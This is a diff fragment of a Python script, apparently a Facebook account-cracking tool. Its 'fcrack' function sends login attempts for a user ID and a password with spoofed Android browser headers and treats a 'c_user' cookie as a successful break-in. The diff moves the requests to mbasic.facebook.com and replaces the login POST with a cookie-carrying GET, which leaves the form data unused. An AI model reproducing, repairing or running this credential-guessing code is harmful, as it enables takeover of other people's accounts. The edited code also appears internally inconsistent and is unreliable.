@@ -1467,14 +1467,14 @@ def fcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'x.facebook.com',
+            headers = {'authority': 'mbasic.facebook.com',
             'method': 'GET',
             'path': '/',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="108", "Google Chrome";v="108"',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-fetch-dest': 'document',
@@ -1482,9 +1482,8 @@ def fcrack(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro}
-            lo = session.post('https://x.facebook.com//login/device-based/login/async/?refsrc',data=log_data,headers=header_freefb).text
+            'user-agent': 'Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0',}
+            response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
